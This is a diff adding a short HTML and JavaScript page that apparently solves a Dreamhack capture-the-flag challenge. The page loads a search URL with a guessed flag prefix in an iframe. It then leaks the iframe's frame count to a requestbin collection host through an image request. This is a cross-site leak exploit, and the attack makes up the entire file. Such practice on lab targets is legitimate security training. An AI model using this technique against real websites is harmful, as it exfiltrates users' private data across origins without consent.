@@ -1,0 +1,11 @@
+<iframe id=""iframe"></iframe>
+<img id="img" />
+<script>
+    const iframe = document.getElementById("iframe");
+    iframe.src = "http://host3.dreamhack.games:14836/search?query=DH{";
+    iframe.onload = () => {
+        // https://tools.dreamhack.games/requestbin
+        img.src = `https://pavxjuh.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
+    }
+
+</script>
